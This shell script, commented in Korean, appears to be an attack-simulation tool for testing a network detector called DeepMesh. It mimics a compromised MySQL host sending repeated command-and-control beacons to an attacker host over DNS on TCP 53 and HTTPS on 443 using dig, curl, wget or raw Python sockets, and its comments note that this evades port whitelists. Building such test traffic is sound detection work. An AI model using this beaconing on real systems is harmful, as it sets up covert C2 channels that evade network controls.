#!/bin/sh
# mysql_c2.sh — [structural] 침해된 mysql → 화이트리스트 통과 C&C beacon (TCP:53 + HTTPS:443)
#   위협 모델: 짧은 hello 를 주기적으로 :53(DNS) 또는 :443(HTTPS) 로 전송해 세션 유지.
#     실제 C&C 프레임워크(Cobalt Strike malleable, Mythic) 가 이 방식으로 화이트리스트 우회.
#   DeepMesh 관점: 반복 syn/finrst + 매우 짧은 payload(sz<100) + mysql 이 개시자 → flow signature.
. "$(dirname "$0")/common.sh"

ATTACKER_HOST="${ATTACKER_HOST:-}"
[ -z "$ATTACKER_HOST" ] && ATTACKER_HOST="10.96.0.10"
DNS_PORT="${DNS_PORT:-53}"
HTTPS_PORT="${HTTPS_PORT:-443}"
N_BEACONS="${N_BEACONS:-60}"
BEACON_INTERVAL="${BEACON_INTERVAL:-3}"

DIG_BIN=""
for b in dig drill kdig; do
  command -v "$b" >/dev/null 2>&1 && DIG_BIN="$b" && break
done
HTTP_BIN=""
for b in curl wget; do
  command -v "$b" >/dev/null 2>&1 && HTTP_BIN="$b" && break
done
USE_PY=0
if [ -z "$DIG_BIN" ] || [ -z "$HTTP_BIN" ]; then
  if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
    PY=$(command -v python3 || command -v python); USE_PY=1
  else
    echo "[mysql_c2] dig/curl/python 없음" >&2; exit 3
  fi
fi

dns_beacon() {
  BEACON_ID="$1"
  QNAME="beacon-${BEACON_ID}.c2.tunnel.local"
  if [ -n "$DIG_BIN" ]; then
    "$DIG_BIN" +tcp +tries=1 +time=2 @"$ATTACKER_HOST" "$QNAME" A >/dev/null 2>&1
  elif [ "$USE_PY" = "1" ]; then
    "$PY" -c "
import socket, struct, random
q='$QNAME'
labels=b''.join(bytes([len(p)])+p.encode() for p in q.split('.'))+b'\x00'
tid=random.randint(0,65535)
msg=struct.pack('>HHHHHH',tid,0x0100,1,0,0,0)+labels+struct.pack('>HH',1,1)
try:
    s=socket.create_connection(('$ATTACKER_HOST',$DNS_PORT), timeout=2)
    s.sendall(struct.pack('>H',len(msg))+msg); s.recv(4096); s.close()
except Exception: pass
" 2>/dev/null
  fi
}

https_beacon() {
  BEACON_ID="$1"
  URL="https://${ATTACKER_HOST}:${HTTPS_PORT}/b?id=${BEACON_ID}"
  if [ "$HTTP_BIN" = "curl" ]; then
    curl -k -s --max-time 3 --no-keepalive "$URL" >/dev/null 2>&1
  elif [ "$HTTP_BIN" = "wget" ]; then
    wget -q -O /dev/null --timeout=3 --no-check-certificate --no-http-keep-alive "$URL" 2>/dev/null
  elif [ "$USE_PY" = "1" ]; then
    "$PY" -c "
import socket
try:
    s=socket.create_connection(('$ATTACKER_HOST',$HTTPS_PORT), timeout=3)
    s.sendall(b'GET /b?id=${BEACON_ID} HTTP/1.1\r\nHost: attacker\r\nConnection: close\r\n\r\n')
    s.close()
except Exception: pass
" 2>/dev/null
  fi
}

i=0
while [ "$i" -lt "$N_BEACONS" ]; do
  BID=$(printf "%08x%04x" "$i" "$$")
  # 홀짝으로 DNS/HTTPS 번갈아 → 두 채널 signature 다 잡을 기회
  if [ $((i % 2)) -eq 0 ]; then
    dns_beacon "$BID"
  else
    https_beacon "$BID"
  fi
  i=$((i+1))
  sleep "$BEACON_INTERVAL"
done
echo "[mysql_c2] done N=$N_BEACONS interval=${BEACON_INTERVAL}s DNS:${DNS_PORT}+HTTPS:${HTTPS_PORT} → $ATTACKER_HOST"